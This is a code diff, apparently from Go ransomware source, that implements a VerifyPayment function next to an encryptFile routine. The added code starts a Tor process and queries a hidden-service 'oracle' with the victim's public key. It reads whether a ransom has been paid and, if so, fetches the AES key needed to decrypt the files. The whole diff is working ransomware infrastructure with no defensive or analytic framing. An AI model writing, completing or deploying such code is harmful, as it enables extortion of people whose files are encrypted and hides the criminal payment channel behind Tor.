@@ -366,6 +366,43 @@ func encryptFile(pk *rsa.PublicKey, path string) error {
 }
 
 func VerifyPayment() ([]byte, error) {
-    // TODO
-    return nil, nil
+    publicKey, err := ImportSha1PublicKey()
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to import public key", err)
+    }
+
+    // start tor in the background
+    tor := exe.NewTor(torDirectory, "")
+    err := tor.Start()
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to start tor", err)
+    }
+    defer tor.Close()
+
+    client := ratelimit.NewHTTPClient(5 * time.Minute, 1 * time.Millisecond, true)
+
+    rsp, err := client.Get(hiddenServiceVerify + publicKey)
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to query hidden service oracle", err)
+    }
+    defer rsp.Body.Close()
+
+    var response int64
+    r := bufio.NewReader(rsp.Body)
+
+    err = binary.Read(r, binary.BigEndian, &response)
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to read response", err)
+    }
+
+    if response == 0 {
+        return nil, errNotPaid
+    }
+
+    aesIVKey := make([]byte, 32)
+    _, err = io.ReadFull(r, aesIVKey)
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to read key", err)
+    }
+    return aesIVKey, nil
 }
